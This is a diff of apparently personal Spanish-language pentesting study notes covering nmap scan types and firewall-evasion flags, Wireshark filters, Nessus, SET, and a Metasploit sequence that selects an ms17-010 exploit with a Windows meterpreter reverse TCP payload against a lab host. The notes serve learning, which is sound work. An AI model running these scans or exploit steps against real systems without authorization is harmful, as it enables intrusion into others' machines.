@@ -1,4 +1,4 @@
-
+nmtui
 sudo iw dev    sudo iwconfig
 lsusb
 lsusb -t      driver
@@ -170,9 +170,13 @@ saltar prueba de discovery (firewall) con Pn, o sea sin ping: nmap -p22 -sT -Pn 
 vs.  -sn   que es solo discovery
 
 
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
 NMAP
 nmap -Pn -p41-50 -sU 192.168.20.23   udp, rango de puertos (abierto o filtrado, solo está seguro cuando hay rechazo), con UDP analiza todos y no solo los 1000 carac
 nmap -Pn -p22 -sT 192.168.20.23   saludo TCP de 3 vías
+
 nmap -sn 192.168.20.20-25
 nmap -sn 192.168.20.0/24
 nmap -sP 192.168.57.0/27   [escaneo de red entera o segmento para ver qué equipos están conectados]
@@ -186,6 +190,10 @@ nmap -sU 192.168.57.6   [UDP]
 ping:  UDP simple, paquete ICMP
 fping: TCP saludo de 3 partes
 Firewall puede prohibir la respuesta a pings y fpings
+
+nmap -sT servidor       T de TCP, saludo de 3 partes, mil puertos, mucho ruido
+nmap -sS servidor       S hace el saludo acortado (escaneo de sincronización, no se hace el tercero)
+nmap -sF servidor       envía paquete FIN, si no responde está abierto (responde reset ACK)
 
 Equipos en segmento de red:
 	fping -a -g 192.168.20.1 192.168.20.254 > hosts.txt     [alive, hasta]
@@ -210,10 +218,11 @@ Separar los puertos en "abiertos o filtrados" y "cerrados":
 	nmap -Pn -p41-50 -sU 192.168.20.23             [saltear discovery, puertos 41a50, protocolo UDP]
 
 Escanear evitando que firewall bloquee las respuestas de los puertos por detectar muchos paquetes:
-	nmap -Pn -p22 -sX 192.168.20.23                [Xmas envía paquetes de banderas encendidas, confunde]
+	nmap -sX 192.168.20.23                         [Xmas envía paquetes de banderas encendidas, confunde, no es efectivo con Windows]
+	nmap -Pn -p22 -sX 192.168.20.23
 
 Paquete null:
-	nmap -Pn --p1-50 sN 192.168.20.23
+	nmap -Pn --p1-50 sN 192.168.20.23              [no es efectivo con Windows]
 
 UNIFICACIÓN
 	nmap -Pn -p- -sT -sn 192.168.20.0/24       [ -sU, -sX, -sN ]
@@ -224,8 +233,17 @@ Usar base de datos de scripts de Nmap:
 	(en virtualbox llevar las redes a bridge)
         nmap --script sniffer-detect 192.168.0.0/24   [búsqueda de tarjetas de red en modo promiscuo, o sea haciendo sniffer]
 
+apt-get install zenmap
 
-----------------------------------------------------------------------------------------------------------------------------------------------
+
+Vulnerabilidades:
+	nmap -sV 192.168.57.5    [que diga la versión de los puertos que están corriendo]
+	nmap -sV -T4 -O --script=ssh2-enum-algos 192.168.57.5   [enumerar los algoritmos de ssh]
+	cd /usr/share/nmap/scripts
+
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 CORRER COMANDOS DE KALI (SIMIL VIRTUALIZACIÓN) DENTRO DE OTRO LINUX (MÁQUINA FÍSICA) PARA AHORRAR RAM
 Entrar a Docker:
@@ -242,6 +260,7 @@ Filtros en |Wireshark|:
 	udp.port==8080
 	udp.port==8080 || tcp.port==8080
 	tcp && tcp.port==80 && ip.addr==230.80.1.43
+	tcp.port eq 80
 Stop - File: Export Object [o paquete]
 Save as... formato.pcap.pcapng para tcpdump
 
@@ -386,15 +405,9 @@ Shodan.io: pais port:25
 www.expoil-db.com [exploits públicos, criterios de búsqueda]
 
 
-------------------------------------------------------------------------------------------------------
+#################################################################################################################################
 
 ESCANEO Y ANÁLISIS DE VULNERABILIDADES
-
-Igualmente:
-	nmap -sV 192.168.57.5    [que diga la versión de los puertos que están corriendo]
-	nmap -sV -T4 -O --script=ssh2-enum-algos 192.168.57.5   [enumerar los algoritmos de ssh]
-	cd /usr/share/nmap/scripts
-
 
 Nessus - análisis desde base de datos de vulnerabilidades, como Openvas
 www.tenable.com/products/nessus-home   (gratis 16 ip por licencia)
@@ -640,7 +653,8 @@ Keyloggers de Hardware: No interactúan con el OS, por tanto no son detectables.
 Keyjack: Con una placa y un receptor, se interceptan las señales emitidas por
  los teclados inalámbricos.
 
----------------------------------------------------------------------------------------------------------------
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 SET
 git clone https://github.com/trustedsec/social-engineer-toolkit/ setoolkit/
@@ -652,16 +666,19 @@ METASPLOIT
 curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
   chmod 755 msfinstall && \
   ./msfinstall
-suro service postgresql start
+sudo service postgresql start
+msfupdate
 
 sudo /opt/metasploir-frameword/bin/msfconsole
---> search [ms17-010]
+--> search [ms17-010, conseguido por openvas]          search windows 2003           search exploir windows 2003
+    search payload windows meterpreter reverse tcp
 --> use [5]
 --> show payloads
 --> set payload [windows/...]   o el id
 --> show options
 --> set RHOST 192.168.0.153
 --> exploit
+en meterpreter usar 'help'
 
 Análisis de metadatos: ver la aplicación de chema alonso https://www.elevenpaths.com/es/labstools/foca-2/index.html
 
